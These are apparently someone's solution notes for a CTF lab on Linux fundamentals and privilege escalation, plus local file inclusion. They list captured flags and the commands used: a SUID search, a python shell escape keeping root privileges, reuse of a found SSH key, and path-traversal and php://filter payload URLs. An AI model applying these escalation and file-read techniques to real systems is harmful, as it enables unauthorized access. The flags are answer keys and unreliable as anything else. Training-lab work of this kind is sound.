####### Linux Fundamentals / Privesc challenge ############

ssh in and ls
flag 1 - cybersoc{D3m_4Re_Th3_fiL35}

cd look-in-here
cat flag2.txt
flag 2 - cybersoc{C4t_D0esnt_M34N_TH3_an1m4l}

ls -la
cd also/in/here and cat .flag3 
flag 3 - cybersoc{H1dD3n_F1l3s_f0UnD}


find . -name "flag4.txt" -print 2>/dev/null
cat ./var/backups/.my/secret/backup/folder/is/here/flag4.txt
flag 4 - cybersoc{I_H0Pe_You_Us3d_f1nd}

sudo -l
sudo -u flag5 /bin/bash
cd home -> flag5 -> cat flag5.txt
flag 5 - cybersoc{Ps3uD0_S3cUR1tY_1s_C0ol}

find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
(find / -type f -a ( -perm -u+s -o -perm -g+s ) -exec ls -l {} ; 2> /dev/null)
cd /opt/bins
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'                                                                                                 
cd /home -> /flag6 -> cat flag6.txt                                                                                                                      
flag6 - cybersoc{N1c3_EUID_H3ck3r}                                                                                                                       
                                                                                                                                                         
ls -la                                                                                                                                                   
cd .ssh                                                                                                                                                  
ssh -i /home/flag6/.ssh/id_flag7 flag7@127.0.0.1                                                                                                         
flag 7 - cybersoc{Put_P4s5w0rDs_0N_sSh_K3y5} 

#############################################################
LOFI challenges
https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers

flag 1 - http://10.128.238.88/?page=/var/www/html/../../../flag.txt

flag 2 - http://10.128.238.88/?page=php://filter/convert.base64-encode/resource=flag.php
